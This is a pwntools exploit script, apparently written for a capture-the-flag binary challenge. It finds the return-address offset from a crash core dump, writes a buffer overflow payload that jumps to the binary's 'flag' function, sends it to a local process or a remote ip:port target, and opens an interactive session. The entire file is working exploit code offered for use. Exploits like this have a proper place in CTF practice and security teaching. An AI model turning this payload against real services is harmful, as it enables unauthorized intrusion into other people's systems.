from pwn import *
import sys

argv = sys.argv

DEBUG = False
BINARY = argv[1]
elf = ELF(BINARY)
FLAG_ADDR = elf.symbols["flag"]


context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
	gdb.attach(sh)


if DEBUG:
	context.log_level = 'debug'

def getAutoPayload():
	# Generate a cyclic pattern so that we can auto-find the offset
	payload = cyclic(256)

	# Run the process once so that it crashes
	autoproc = process(BINARY)
	autoproc.sendline(payload)
	autoproc.wait()

	# Get the core dump
	core = Coredump('./core')

	# Our cyclic pattern should have been used as the crashing address
	assert pack(core.fault_addr) in payload

	# Cool! Now let's just replace that value with the address needed
	payload = fit({
    	cyclic_find(pack(core.fault_addr)): FLAG_ADDR
	})
	return payload

def connect():
    if len(argv) < 3:
    	stdout = process.PTY
    	stdin = process.PTY

    	sh = process(BINARY, stdout=stdout, stdin=stdin)

    	if DEBUG:
    		attach_gdb()

    	REMOTE = False
    else:
    	NC = sys.argv[2]
    	ip = NC.split(":")[0]
    	port = int(NC.split(":")[1])
    	sh = remote(ip, port)
    	REMOTE = True
    return sh

# Cool!
splash()

# Generate auto payload
payload = getAutoPayload()

# Connect to local/remote process
sh = connect()

# Send payload
sh.sendline(payload)

# Open shell
sh.interactive()